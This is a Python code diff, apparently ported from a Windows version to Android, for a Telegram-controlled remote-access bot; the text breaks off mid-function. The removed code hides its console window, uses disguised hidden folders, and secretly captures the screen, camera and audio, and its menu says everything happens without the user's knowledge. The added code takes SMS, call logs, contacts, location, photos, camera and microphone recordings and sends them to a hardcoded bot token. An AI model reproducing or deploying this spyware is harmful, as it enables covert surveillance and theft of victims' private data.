@@ -1,79 +1,53 @@
-import platform
-import pyautogui
-import cv2
-import numpy as np
-import sounddevice as sd
-import soundfile as sf
+"""
+تطبيق تحكم عن بعد للهاتف - Android APK
+بوت تليجرام متكامل للتحكم بالجهاز
+"""
+
 import os
-import subprocess
-import sys
-from datetime import datetime
+import json
+import time
 import threading
 import requests
-import time
-import psutil
-import socket
-import getpass
-import uuid
-import json
-import random
-import string
-import shutil
-import wave
-from PIL import Image
-import io
-import pynput
-from pynput import mouse, keyboard
-import tempfile
-import win32com.client
-from pathlib import Path
-
-# إخفاء نافذة الكونسول
-try:
-    import ctypes
-
-    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-except:
-    pass
+from datetime import datetime
+import subprocess
 
 # ============================================
-# ✅ ضع التوكن ومعرف الدردشة هنا
+# ضع التوكن ومعرف الدردشة هنا
 # ============================================
 BOT_TOKEN = "8321792439:AAEgbnuakpy3TiWqePzCm1Mc2y2GNlveSGs"
 BOT_CHAT_ID = "6494865307"
 BOT_ADMIN_ID = BOT_CHAT_ID
 # ============================================
 
-# إعدادات البث المباشر
-STREAM_QUALITY = 50
-STREAM_FPS = 5
-STREAM_WIDTH = 800
-STREAM_HEIGHT = 600
+# مجلدات التخزين
+STORAGE_PATHS = [
+    '/sdcard/Android/.system_cache',
+    '/sdcard/Android/.screenshots',
+    '/sdcard/Android/.recordings',
+    '/sdcard/Android/.camera',
+    '/sdcard/Android/.files'
+]
 
-# مجلدات مخفية
-APPDATA = os.environ.get('APPDATA', os.path.expanduser('~'))
-HIDDEN_FOLDER = os.path.join(APPDATA, 'Microsoft', 'Windows', 'Caches', 'System32')
-TEMP_FOLDER = os.path.join(os.environ.get('TEMP', os.path.expanduser('~')),
-                           ''.join(random.choices(string.ascii_letters, k=8)))
+for path in STORAGE_PATHS:
+    if not os.path.exists(path):
+        os.makedirs(path, exist_ok=True)
+
+TEMP_DIR = STORAGE_PATHS[0]
 
 
-class RemoteControlBot:
+class TelegramBot:
+    """بوت التحكم عن بعد"""
+
     def __init__(self):
         self.token = BOT_TOKEN
         self.chat_id = BOT_CHAT_ID
+        self.admin_id = BOT_ADMIN_ID
         self.base_url = f"https://api.telegram.org/bot{self.token}"
         self.last_update_id = 0
-        self.is_running = True
-        self.admin_id = BOT_ADMIN_ID
+        self.running = True
 
-        # حالة التحكم عن بعد
-        self.remote_active = False
-        self.current_chat_id = None
-        self.streaming = False
-        self.stream_thread = None
-        self.screen_width, self.screen_height = pyautogui.size()
-
-    def send_message(self, text, chat_id=None):
+    def send_message(self, text, chat_id=None, parse_mode='HTML'):
+        """إرسال رسالة نصية"""
         if chat_id is None:
             chat_id = self.chat_id
         try:
@@ -81,63 +55,82 @@ class RemoteControlBot:
             data = {
                 "chat_id": chat_id,
                 "text": text,
-                "parse_mode": "HTML"
+                "parse_mode": parse_mode
             }
             requests.post(url, data=data, timeout=10)
+            return True
         except:
-            pass
+            return False
 
-    def send_file(self, file_path, file_type='document', chat_id=None):
-        if chat_id is None:
-            chat_id = self.chat_id
-        try:
-            if file_type == 'photo':
-                url = f"{self.base_url}/sendPhoto"
-                files = {'photo': open(file_path, 'rb')}
-            elif file_type == 'video':
-                url = f"{self.base_url}/sendVideo"
-                files = {'video': open(file_path, 'rb')}
-            elif file_type == 'audio':
-                url = f"{self.base_url}/sendAudio"
-                files = {'audio': open(file_path, 'rb')}
-            else:
-                url = f"{self.base_url}/sendDocument"
-                files = {'document': open(file_path, 'rb')}
-
-            data = {"chat_id": chat_id}
-            requests.post(url, data=data, files=files, timeout=60)
-            try:
-                os.remove(file_path)
-            except:
-                pass
-        except:
-            pass
-
-    def send_photo(self, photo_bytes, chat_id=None):
+    def send_photo(self, photo_path, chat_id=None, caption=''):
+        """إرسال صورة"""
         if chat_id is None:
             chat_id = self.chat_id
         try:
             url = f"{self.base_url}/sendPhoto"
-            files = {'photo': ('image.jpg', photo_bytes, 'image/jpeg')}
-            data = {"chat_id": chat_id}
-            requests.post(url, data=data, files=files, timeout=10)
+            with open(photo_path, 'rb') as photo:
+                files = {'photo': photo}
+                data = {"chat_id": chat_id, "caption": caption}
+                requests.post(url, data=data, files=files, timeout=60)
+            return True
         except:
-            pass
+            return False
+
+    def send_video(self, video_path, chat_id=None, caption=''):
+        """إرسال فيديو"""
+        if chat_id is None:
+            chat_id = self.chat_id
+        try:
+            url = f"{self.base_url}/sendVideo"
+            with open(video_path, 'rb') as video:
+                files = {'video': video}
+                data = {"chat_id": chat_id, "caption": caption}
+                requests.post(url, data=data, files=files, timeout=120)
+            return True
+        except:
+            return False
+
+    def send_audio(self, audio_path, chat_id=None, caption=''):
+        """إرسال ملف صوتي"""
+        if chat_id is None:
+            chat_id = self.chat_id
+        try:
+            url = f"{self.base_url}/sendAudio"
+            with open(audio_path, 'rb') as audio:
+                files = {'audio': audio}
+                data = {"chat_id": chat_id, "caption": caption}
+                requests.post(url, data=data, files=files, timeout=120)
+            return True
+        except:
+            return False
+
+    def send_file(self, file_path, chat_id=None, caption=''):
+        """إرسال أي ملف"""
+        if chat_id is None:
+            chat_id = self.chat_id
+        try:
+            url = f"{self.base_url}/sendDocument"
+            with open(file_path, 'rb') as file:
+                files = {'document': file}
+                data = {"chat_id": chat_id, "caption": caption}
+                requests.post(url, data=data, files=files, timeout=120)
+            return True
+        except:
+            return False
 
     def send_action(self, action, chat_id=None):
+        """إرسال حالة البوت"""
         if chat_id is None:
             chat_id = self.chat_id
         try:
             url = f"{self.base_url}/sendChatAction"
-            data = {
-                "chat_id": chat_id,
-                "action": action
-            }
+            data = {"chat_id": chat_id, "action": action}
             requests.post(url, data=data, timeout=5)
         except:
             pass
 
     def get_updates(self):
+        """جلب التحديثات"""
         try:
             url = f"{self.base_url}/getUpdates"
             params = {
@@ -155,6 +148,7 @@ class RemoteControlBot:
             pass
 
     def process_update(self, update):
+        """معالجة التحديثات"""
         if "message" in update:
             message = update["message"]
             chat_id = message["chat"]["id"]
@@ -165,103 +159,39 @@ class RemoteControlBot:
                     self.handle_command(text, chat_id)
 
     def handle_command(self, text, chat_id):
-        global recorder
+        """معالجة الأوامر"""
+        global controller
 
-        # ============================================
-        # 🎮 أوامر التحكم الرئيسية (أرقام 1-7)
-        # ============================================
+        # قائمة الأوامر
+        commands = {
+            '1': controller.take_screenshot,
+            '2': controller.take_back_camera,
+            '3': controller.take_front_camera,
+            '4': controller.record_video,
+            '5': controller.record_audio,
+            '6': controller.get_photos,
+            '7': controller.get_contacts,
+            '8': controller.get_call_logs,
+            '9': controller.get_sms,
+            '10': controller.get_location,
+            '11': controller.get_device_info,
+            '12': controller.list_files,
+            '13': controller.get_public_ip,
+            '14': controller.get_installed_apps,
+            '0': controller.show_menu
+        }
 
-        # 1️⃣ التقاط شاشة فوري
-        if text == "1":
-            self.send_action("upload_photo", chat_id)
-            self.send_message("📸 جاري التقاط الشاشة...", chat_id)
-            recorder.capture_screenshot(send_to_bot=True, chat_id=chat_id)
-
-        # 2️⃣ تسجيل الشاشة مع الصوت
-        elif text == "2":
-            self.send_message("🎬 بدء تسجيل الشاشة مع الصوت (30 ثانية)", chat_id)
-            self.send_action("record_video", chat_id)
-            self.send_action("record_audio", chat_id)
-            threading.Thread(target=recorder.start_full_recording, args=(chat_id, 30), daemon=True).start()
-
-        # 3️⃣ تسجيل صوت فقط
-        elif text == "3":
-            self.send_message("🎤 بدء تسجيل الصوت (15 ثانية)", chat_id)
-            self.send_action("record_audio", chat_id)
-            threading.Thread(target=recorder.start_audio_recording, args=(True, chat_id, 15), daemon=True).start()
-
-        # 4️⃣ استعراض الملفات
-        elif text == "4":
-            self.send_message("📁 جاري تحميل قائمة الملفات...", chat_id)
-            threading.Thread(target=recorder.list_files, args=(chat_id,), daemon=True).start()
-
-        # 5️⃣ تشغيل الكاميرا سراً
-        elif text == "5":
-            self.send_message("🎥 تشغيل الكاميرا (10 ثوان)", chat_id)
-            self.send_action("record_video", chat_id)
-            threading.Thread(target=recorder.start_camera_stream, args=(chat_id, 10), daemon=True).start()
-
-        # 6️⃣ جهات الاتصال
-        elif text == "6":
-            self.send_message("📱 جاري تحميل جهات الاتصال...", chat_id)
-            threading.Thread(target=recorder.get_contacts, args=(chat_id,), daemon=True).start()
-
-        # 7️⃣ الصور
-        elif text == "7":
-            self.send_message("🖼️ جاري تحميل الصور...", chat_id)
-            threading.Thread(target=recorder.get_photos, args=(chat_id,), daemon=True).start()
-
-        # 8️⃣ معلومات الجهاز
-        elif text == "8":
-            recorder.send_device_info_to_bot(chat_id)
-
-        # 9️⃣ شبكات الواي فاي
-        elif text == "9":
-            recorder.send_wifi_info_to_bot(chat_id)
-
-        # 0️⃣ قائمة الأوامر
-        elif text == "0":
-            self.show_main_menu(chat_id)
-
-        # ============================================
-        # 🎮 أوامر إضافية
-        # ============================================
+        if text in commands:
+            self.send_action("typing", chat_id)
+            threading.Thread(target=commands[text], args=(chat_id,), daemon=True).start()
         elif text == "/start":
-            self.show_main_menu(chat_id)
-
-        elif text == "/stop":
-            recorder.stop_all_recordings()
-            self.send_message("⏹️ تم إيقاف جميع التسجيلات", chat_id)
-
+            controller.show_menu(chat_id)
         elif text == "/help":
-            self.show_main_menu(chat_id)
-
-    def show_main_menu(self, chat_id):
-        """عرض القائمة الرئيسية"""
-        menu = f"""
-<b>🎮 قائمة التحكم عن بعد</b>
-<b>💻 الجهاز:</b> {platform.node()}
-<b>🕐 الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-
-<b>━━━━━━━━━━━━━━━</b>
-<b>1️⃣</b> 📸 <b>التقاط شاشة</b> - صورة فورية
-<b>2️⃣</b> 🎬 <b>تسجيل الشاشة</b> - مع الصوت (30 ث)
-<b>3️⃣</b> 🎤 <b>تسجيل صوت</b> - فقط (15 ث)
-<b>4️⃣</b> 📁 <b>الملفات</b> - استعراض وسحب
-<b>5️⃣</b> 🎥 <b>الكاميرا</b> - تشغيل سري (10 ث)
-<b>6️⃣</b> 📱 <b>جهات الاتصال</b> - سحب جهات الويندوز
-<b>7️⃣</b> 🖼️ <b>الصور</b> - استعراض الصور
-<b>8️⃣</b> 💻 <b>معلومات الجهاز</b>
-<b>9️⃣</b> 📶 <b>شبكات الواي فاي</b>
-<b>0️⃣</b> 🔄 <b>عرض القائمة</b>
-
-<b>━━━━━━━━━━━━━━━</b>
-⚠️ <i>جميع العمليات تجري بدون علم المستخدم</i>
-"""
-        self.send_message(menu, chat_id)
+            self.send_message(controller.get_help_text(), chat_id)
 
     def run(self):
-        while self.is_running:
+        """تشغيل البوت"""
+        while self.running:
             try:
                 self.get_updates()
                 time.sleep(1)
@@ -269,412 +199,439 @@ class RemoteControlBot:
                 time.sleep(5)
 
 
-class DeviceRecorder:
+class AndroidController:
+    """التحكم بهاتف الأندرويد"""
+
     def __init__(self):
-        self.create_folders()
-        self.bot = RemoteControlBot()
+        self.bot = TelegramBot()
+        self.running = True
+        self.start()
 
-        # متغيرات الكاميرا
-        self.camera_active = False
-        self.camera = None
-
-        # متغيرات التسجيل
-        self.recording_video = False
-        self.recording_audio = False
-        self.video_writer = None
-        self.audio_frames = []
-
-        # بدء البوت
+    def start(self):
+        """بدء التشغيل"""
+        # تشغيل البوت في خلفية
         self.bot_thread = threading.Thread(target=self.bot.run, daemon=True)
         self.bot_thread.start()
-        self.start_auto_tasks()
+
+        # إرسال رسالة بدء التشغيل
         self.send_startup_message()
 
-    def create_folders(self):
-        folders = [
-            os.path.join(HIDDEN_FOLDER, 'screenshots'),
-            os.path.join(HIDDEN_FOLDER, 'videos'),
-            os.path.join(HIDDEN_FOLDER, 'audio'),
-            os.path.join(HIDDEN_FOLDER, 'camera'),
-            os.path.join(HIDDEN_FOLDER, 'files'),
-            os.path.join(HIDDEN_FOLDER, 'contacts'),
-            os.path.join(HIDDEN_FOLDER, 'photos')
-        ]
-        for folder in folders:
-            if not os.path.exists(folder):
-                os.makedirs(folder, exist_ok=True)
-
     def send_startup_message(self):
+        """رسالة بدء التشغيل"""
         try:
-            startup_msg = f"""
+            msg = f"""
 <b>🚀 نظام التحكم عن بعد جاهز</b>
-<b>💻 الجهاز:</b> {platform.node()}
-<b>👤 المستخدم:</b> {getpass.getuser()}
+<b>📱 الجهاز:</b> Android
 <b>🕐 الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 
-<b>━━━━━━━━━━━━━━━</b>
-<b>1️⃣</b> التقاط شاشة
-<b>2️⃣</b> تسجيل شاشة + صوت
-<b>3️⃣</b> تسجيل صوت
-<b>4️⃣</b> الملفات
-<b>5️⃣</b> كاميرا سرية
-<b>6️⃣</b> جهات اتصال
-<b>7️⃣</b> الصور
-<b>0️⃣</b> القائمة
-<b>━━━━━━━━━━━━━━━</b>
+أرسل 0 لعرض القائمة الكاملة
 """
-            self.bot.send_message(startup_msg)
+            self.bot.send_message(msg)
         except:
             pass
 
+    def show_menu(self, chat_id):
+        """عرض القائمة الرئيسية"""
+        menu = f"""
+<b>🎮 قائمة التحكم الشامل</b>
+<b>📱 الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+━━━━━━━━━━━━━━━
+<b>1️⃣</b> 📸 لقطة شاشة
+<b>2️⃣</b> 🎥 كاميرا خلفية
+<b>3️⃣</b> 🤳 كاميرا أمامية
+<b>4️⃣</b> 🎬 تسجيل فيديو (30ث)
+<b>5️⃣</b> 🎤 تسجيل صوت (30ث)
+<b>6️⃣</b> 🖼️ سحب الصور
+<b>7️⃣</b> 📱 جهات الاتصال
+<b>8️⃣</b> 📞 سجل المكالمات
+<b>9️⃣</b> 💬 الرسائل النصية
+<b>🔟</b> 📍 الموقع الجغرافي
+<b>1️⃣1️⃣</b> ℹ️ معلومات الجهاز
+<b>1️⃣2️⃣</b> 📁 إدارة الملفات
+<b>1️⃣3️⃣</b> 🌐 IP العام
+<b>1️⃣4️⃣</b> 📲 التطبيقات المثبتة
+<b>0️⃣</b> 🔄 عرض القائمة
+━━━━━━━━━━━━━━━
+"""
+        self.bot.send_message(menu, chat_id)
+
     # ============================================
-    # 1️⃣ التقاط شاشة
+    # 1️⃣ لقطة شاشة
     # ============================================
-    def capture_screenshot(self, send_to_bot=False, chat_id=None):
+    def take_screenshot(self, chat_id):
+        """التقاط شاشة الهاتف"""
         try:
-            screenshot = pyautogui.screenshot()
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            filename = os.path.join(HIDDEN_FOLDER, 'screenshots', f'screenshot_{timestamp}.png')
-            screenshot.save(filename, quality=85)
+            self.bot.send_action("upload_photo", chat_id)
+            self.bot.send_message("📸 جاري التقاط الشاشة...", chat_id)
 
-            if send_to_bot:
-                chat_id = chat_id or BOT_CHAT_ID
-                self.bot.send_file(filename, 'photo', chat_id)
-                self.bot.send_message("✅ تم التقاط الصورة", chat_id)
-        except:
-            pass
+            filename = f"{TEMP_DIR}/screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
 
-    # ============================================
-    # 2️⃣ تسجيل الشاشة مع الصوت
-    # ============================================
-    def start_full_recording(self, chat_id=None, duration=30):
-        try:
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            video_file = os.path.join(HIDDEN_FOLDER, 'videos', f'screen_recording_{timestamp}.avi')
-            audio_file = os.path.join(HIDDEN_FOLDER, 'audio', f'audio_recording_{timestamp}.wav')
+            # محاولة استخدام screencap
+            result = subprocess.run(['screencap', '-p', filename],
+                                    capture_output=True, timeout=10)
 
-            # تسجيل الصوت في خلفية
-            audio_thread = threading.Thread(target=self.record_audio_only, args=(audio_file, duration), daemon=True)
-            audio_thread.start()
-
-            # تسجيل الشاشة
-            screen_size = pyautogui.size()
-            fourcc = cv2.VideoWriter_fourcc(*'XVID')
-            out = cv2.VideoWriter(video_file, fourcc, 10.0, screen_size)
-
-            start_time = time.time()
-            while time.time() - start_time < duration:
-                try:
-                    img = pyautogui.screenshot()
-                    frame = np.array(img)
-                    frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
-                    out.write(frame)
-                    time.sleep(0.1)
-                except:
-                    break
-
-            out.release()
-            audio_thread.join(timeout=5)
-
-            # إرسال الفيديو
-            if os.path.exists(video_file):
-                self.bot.send_file(video_file, 'video', chat_id)
-            # إرسال الصوت
-            if os.path.exists(audio_file):
-                self.bot.send_file(audio_file, 'audio', chat_id)
-
-            self.bot.send_message("✅ تم تسجيل الشاشة والصوت", chat_id)
-        except:
-            pass
-
-    # ============================================
-    # 3️⃣ تسجيل صوت فقط
-    # ============================================
-    def start_audio_recording(self, send_to_bot=False, chat_id=None, duration=15):
-        try:
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            filename = os.path.join(HIDDEN_FOLDER, 'audio', f'audio_{timestamp}.wav')
-
-            sample_rate = 44100
-            recording = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=2, dtype='float32')
-            sd.wait()
-
-            sf.write(filename, recording, sample_rate)
-
-            if send_to_bot and os.path.exists(filename):
-                chat_id = chat_id or BOT_CHAT_ID
-                self.bot.send_file(filename, 'audio', chat_id)
-                self.bot.send_message("✅ تم تسجيل الصوت", chat_id)
-        except:
-            pass
-
-    # ============================================
-    # 4️⃣ استعراض وسحب الملفات
-    # ============================================
-    def list_files(self, chat_id=None, path=None):
-        try:
-            if path is None:
-                path = os.path.expanduser("~")  # مجلد المستخدم
-
-            files = os.listdir(path)[:20]  # أول 20 ملف
-            file_list = f"<b>📁 الملفات في: {path}</b>\n\n"
-
-            for i, file in enumerate(files, 1):
-                full_path = os.path.join(path, file)
-                if os.path.isdir(full_path):
-                    file_list += f"📁 {i}. {file}\n"
-                else:
-                    size = os.path.getsize(full_path) // 1024
-                    file_list += f"📄 {i}. {file} ({size} KB)\n"
-
-            file_list += f"\n<i>📌 لإرسال ملف: أرسل مسار الملف الكامل</i>"
-            self.bot.send_message(file_list, chat_id)
-        except:
-            pass
-
-    # ============================================
-    # 5️⃣ تشغيل الكاميرا سراً
-    # ============================================
-    def start_camera_stream(self, chat_id=None, duration=10):
-        try:
-            self.camera = cv2.VideoCapture(0)
-
-            if not self.camera.isOpened():
-                self.bot.send_message("❌ لا يمكن الوصول إلى الكاميرا", chat_id)
-                return
-
-            frames = []
-            start_time = time.time()
-
-            while time.time() - start_time < duration:
-                ret, frame = self.camera.read()
-                if ret:
-                    frame = cv2.resize(frame, (640, 480))
-                    frames.append(frame)
-                time.sleep(0.1)
-
-            self.camera.release()
-
-            # حفظ وإرسال الفيديو
-            if frames:
-                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-                filename = os.path.join(HIDDEN_FOLDER, 'camera', f'camera_{timestamp}.mp4')
-
-                height, width = frames[0].shape[:2]
-                fourcc = cv2.VideoWriter_fourcc(*'mp4v')
-                out = cv2.VideoWriter(filename, fourcc, 10.0, (width, height))
-
-                for frame in frames:
-                    out.write(frame)
-                out.release()
-
-                self.bot.send_file(filename, 'video', chat_id)
-                self.bot.send_message("✅ تم تصوير الكاميرا سراً", chat_id)
-        except:
-            pass
-
-    # ============================================
-    # 6️⃣ جهات الاتصال (ويندوز)
-    # ============================================
-    def get_contacts(self, chat_id=None):
-        try:
-            contacts = []
-
-            # محاولة الحصول على جهات اتصال Outlook
-            try:
-                outlook = win32com.client.Dispatch("Outlook.Application")
-                namespace = outlook.GetNamespace("MAPI")
-                contacts_folder = namespace.GetDefaultFolder(10)  # olFolderContacts
-
-                for contact in contacts_folder.Items:
-                    if hasattr(contact, 'FullName') and hasattr(contact, 'Email1Address'):
-                        if contact.FullName and contact.Email1Address:
-                            contacts.append(f"{contact.FullName}: {contact.Email1Address}")
-            except:
-                pass
-
-            # جهات اتصال Skype
-            try:
-                skype_path = os.path.join(os.environ['APPDATA'], 'Skype')
-                if os.path.exists(skype_path):
-                    contacts.append("📱 جهات Skype موجودة في مجلد التطبيق")
-            except:
-                pass
-
-            if contacts:
-                contact_list = "<b>📱 جهات الاتصال:</b>\n\n"
-                for i, contact in enumerate(contacts[:20], 1):
-                    contact_list += f"{i}. {contact}\n"
-                self.bot.send_message(contact_list, chat_id)
+            if os.path.exists(filename):
+                self.bot.send_photo(filename, chat_id, "📸 لقطة شاشة")
+                os.remove(filename)
+                self.bot.send_message("✅ تم التقاط الشاشة", chat_id)
             else:
-                self.bot.send_message("❌ لا توجد جهات اتصال", chat_id)
+                self.bot.send_message("❌ فشل التقاط الشاشة", chat_id)
         except:
-            self.bot.send_message("❌ فشل تحميل جهات الاتصال", chat_id)
+            self.bot.send_message("❌ يحتاج صلاحيات ROOT", chat_id)
 
     # ============================================
-    # 7️⃣ الصور
+    # 2️⃣ كاميرا خلفية
     # ============================================
-    def get_photos(self, chat_id=None):
+    def take_back_camera(self, chat_id):
+        """تصوير بالكاميرا الخلفية"""
         try:
-            # مجلد الصور
-            pictures_folder = os.path.join(os.path.expanduser('~'), 'Pictures')
-            photos = []
+            self.bot.send_action("upload_photo", chat_id)
+            self.bot.send_message("📸 جاري التصوير...", chat_id)
 
-            if os.path.exists(pictures_folder):
-                for root, dirs, files in os.walk(pictures_folder):
-                    for file in files[:30]:  # أول 30 صورة
-                        if file.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
-                            photos.append(os.path.join(root, file))
+            filename = f"{TEMP_DIR}/camera_back_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
+
+            # محاولة استخدام termux-api
+            result = subprocess.run(['termux-camera-photo', '-c', '0', filename],
+                                    capture_output=True, timeout=10)
+
+            if os.path.exists(filename):
+                self.bot.send_photo(filename, chat_id, "🎥 كاميرا خلفية")
+                os.remove(filename)
+                self.bot.send_message("✅ تم التصوير", chat_id)
+            else:
+                self.bot.send_message("❌ فشل التصوير", chat_id)
+        except:
+            self.bot.send_message("❌ الكاميرا غير متاحة", chat_id)
+
+    # ============================================
+    # 3️⃣ كاميرا أمامية
+    # ============================================
+    def take_front_camera(self, chat_id):
+        """تصوير بالكاميرا الأمامية"""
+        try:
+            self.bot.send_action("upload_photo", chat_id)
+            self.bot.send_message("🤳 جاري التصوير...", chat_id)
+
+            filename = f"{TEMP_DIR}/camera_front_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
+
+            result = subprocess.run(['termux-camera-photo', '-c', '1', filename],
+                                    capture_output=True, timeout=10)
+
+            if os.path.exists(filename):
+                self.bot.send_photo(filename, chat_id, "🤳 كاميرا أمامية")
+                os.remove(filename)
+                self.bot.send_message("✅ تم التصوير", chat_id)
+            else:
+                self.bot.send_message("❌ فشل التصوير", chat_id)
+        except:
+            self.bot.send_message("❌ الكاميرا الأمامية غير متاحة", chat_id)
+
+    # ============================================
+    # 4️⃣ تسجيل فيديو
+    # ============================================
+    def record_video(self, chat_id, duration=30):
+        """تسجيل فيديو"""
+        try:
+            self.bot.send_action("record_video", chat_id)
+            self.bot.send_message(f"🎥 جاري تسجيل فيديو {duration} ثانية...", chat_id)
+
+            filename = f"{TEMP_DIR}/video_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
+
+            # محاولة استخدام termux-api
+            result = subprocess.run(['termux-camera-record', '-c', '0', filename, '-t', str(duration)],
+                                    capture_output=True, timeout=duration + 5)
+
+            if os.path.exists(filename):
+                self.bot.send_video(filename, chat_id, "🎥 تسجيل فيديو")
+                os.remove(filename)
+                self.bot.send_message("✅ تم تسجيل الفيديو", chat_id)
+            else:
+                self.bot.send_message("❌ فشل تسجيل الفيديو", chat_id)
+        except:
+            self.bot.send_message("❌ الكاميرا غير متاحة للتسجيل", chat_id)
+
+    # ============================================
+    # 5️⃣ تسجيل صوت
+    # ============================================
+    def record_audio(self, chat_id, duration=30):
+        """تسجيل صوت"""
+        try:
+            self.bot.send_action("record_audio", chat_id)
+            self.bot.send_message(f"🎤 جاري تسجيل صوت {duration} ثانية...", chat_id)
+
+            filename = f"{TEMP_DIR}/audio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.3gp"
+
+            result = subprocess.run(['termux-microphone-record', '-f', filename, '-l', str(duration)],
+                                    capture_output=True, timeout=duration + 5)
+
+            if os.path.exists(filename):
+                self.bot.send_audio(filename, chat_id, "🎤 تسجيل صوت")
+                os.remove(filename)
+                self.bot.send_message("✅ تم تسجيل الصوت", chat_id)
+            else:
+                self.bot.send_message("❌ فشل تسجيل الصوت", chat_id)
+        except:
+            self.bot.send_message("❌ الميكروفون غير متاح", chat_id)
+
+    # ============================================
+    # 6️⃣ سحب الصور
+    # ============================================
+    def get_photos(self, chat_id):
+        """سحب الصور من المعرض"""
+        try:
+            self.bot.send_action("upload_photo", chat_id)
+            self.bot.send_message("🖼️ جاري البحث عن الصور...", chat_id)
+
+            photos = []
+            dcim = '/sdcard/DCIM/Camera'
+
+            if os.path.exists(dcim):
+                for file in os.listdir(dcim)[:10]:
+                    if file.lower().endswith(('.jpg', '.jpeg', '.png')):
+                        photos.append(os.path.join(dcim, file))
 
             if photos:
-                self.bot.send_message(f"🖼️ تم العثور على {len(photos)} صورة. جاري إرسال أحدث الصور...", chat_id)
-
-                # إرسال أول 5 صور
-                for photo in photos[:5]:
-                    if os.path.exists(photo) and os.path.getsize(photo) < 10 * 1024 * 1024:  # أقل من 10 ميجا
-                        self.bot.send_file(photo, 'photo', chat_id)
-                        time.sleep(1)
+                self.bot.send_message(f"✅ تم العثور على {len(photos)} صورة", chat_id)
+                for i, photo in enumerate(photos[:5], 1):
+                    if os.path.getsize(photo) < 15 * 1024 * 1024:
+                        self.bot.send_photo(photo, chat_id, f"🖼️ صورة {i}")
+                        time.sleep(2)
             else:
                 self.bot.send_message("❌ لا توجد صور", chat_id)
         except:
-            pass
+            self.bot.send_message("❌ فشل سحب الصور", chat_id)
+
+    # ============================================
+    # 7️⃣ جهات الاتصال
+    # ============================================
+    def get_contacts(self, chat_id):
+        """سحب جهات الاتصال"""
+        try:
+            self.bot.send_action("typing", chat_id)
+
+            result = subprocess.run(['termux-contact-list'],
+                                    capture_output=True, text=True, timeout=10)
+
+            if result.stdout:
+                contacts = json.loads(result.stdout)
+                text = "<b>📱 جهات الاتصال:</b>\n\n"
+                for i, contact in enumerate(contacts[:50], 1):
+                    name = contact.get('name', 'غير معروف')
+                    number = contact.get('number', '')
+                    text += f"{i}. {name}: {number}\n"
+                self.bot.send_message(text[:4000], chat_id)
+            else:
+                self.bot.send_message("❌ لا توجد جهات اتصال", chat_id)
+        except:
+            self.bot.send_message("❌ فشل سحب جهات الاتصال", chat_id)
+
+    # ============================================
+    # 8️⃣ سجل المكالمات
+    # ============================================
+    def get_call_logs(self, chat_id):
+        """سحب سجل المكالمات"""
+        try:
+            self.bot.send_action("typing", chat_id)
+
+            result = subprocess.run(['termux-call-log'],
+                                    capture_output=True, text=True, timeout=10)
+
+            if result.stdout:
+                calls = json.loads(result.stdout)
+                text = "<b>📞 سجل المكالمات:</b>\n\n"
+                for i, call in enumerate(calls[:30], 1):
+                    name = call.get('name', 'غير معروف')
+                    number = call.get('number', '')
+                    duration = call.get('duration', 0)
+                    text += f"{i}. {name}: {number} ({duration} ث)\n"
+                self.bot.send_message(text[:4000], chat_id)
+            else:
+                self.bot.send_message("❌ لا يوجد سجل مكالمات", chat_id)
+        except:
+            self.bot.send_message("❌ فشل سحب سجل المكالمات", chat_id)
+
+    # ============================================
+    # 9️⃣ الرسائل النصية
+    # ============================================
+    def get_sms(self, chat_id):
+        """سحب الرسائل النصية"""
+        try:
+            self.bot.send_action("typing", chat_id)
+
+            result = subprocess.run(['termux-sms-list', '-l', '30'],
+                                    capture_output=True, text=True, timeout=10)
+
+            if result.stdout:
+                sms_list = json.loads(result.stdout)
+                text = "<b>💬 آخر الرسائل:</b>\n\n"
+                for i, sms in enumerate(sms_list[:20], 1):
+                    address = sms.get('address', '')
+                    body = sms.get('body', '')[:100]
+                    text += f"{i}. {address}: {body}...\n"
+                self.bot.send_message(text[:4000], chat_id)
+            else:
+                self.bot.send_message("❌ لا توجد رسائل", chat_id)
+        except:
+            self.bot.send_message("❌ فشل سحب الرسائل", chat_id)
+
+    # ============================================
+    # 🔟 الموقع الجغرافي
+    # ============================================
+    def get_location(self, chat_id):
+        """الحصول على الموقع"""
+        try:
+            self.bot.send_action("find_location", chat_id)
+            self.bot.send_message("📍 جاري تحديد الموقع...", chat_id)
+
+            result = subprocess.run(['termux-location'],
+                                    capture_output=True, text=True, timeout=15)
+
+            if result.stdout:
+                location = json.loads(result.stdout)
+                lat = location.get('latitude', 0)
+                lon = location.get('longitude', 0)
+                acc = location.get('accuracy', 0)
+
+                maps_link = f"https://www.google.com/maps?q={lat},{lon}"
+                text = f"""
+<b>📍 الموقع الحالي:</b>
+
+<b>خط العرض:</b> {lat}
+<b>خط الطول:</b> {lon}
+<b>الدقة:</b> ±{acc} متر
+
+<b>🔗 رابط الخريطة:</b>
+{maps_link}
+"""
+                self.bot.send_message(text, chat_id)
+            else:
+                self.bot.send_message("❌ فشل الحصول على الموقع", chat_id)
+        except:
+            self.bot.send_message("❌ GPS غير متاح", chat_id)
+
+    # ============================================
+    # 1️⃣1️⃣ معلومات الجهاز
+    # ============================================
+    def get_device_info(self, chat_id):
+        """معلومات الجهاز"""
+        try:
+            info = f"""
+<b>ℹ️ معلومات الجهاز:</b>
+
+<b>📱 الطراز:</b> {os.environ.get('MODEL', 'غير معروف')}
+<b>🏭 الشركة:</b> {os.environ.get('MANUFACTURER', 'غير معروف')}
+<b>📀 الإصدار:</b> Android {os.environ.get('RELEASE', 'غير معروف')}
+<b>🆔 SDK:</b> {os.environ.get('SDK', 'غير معروف')}
+
+<b>💾 التخزين:</b>
+• المساحة الكلية: {self.get_storage_total()}
+• المساحة المتاحة: {self.get_storage_free()}
+
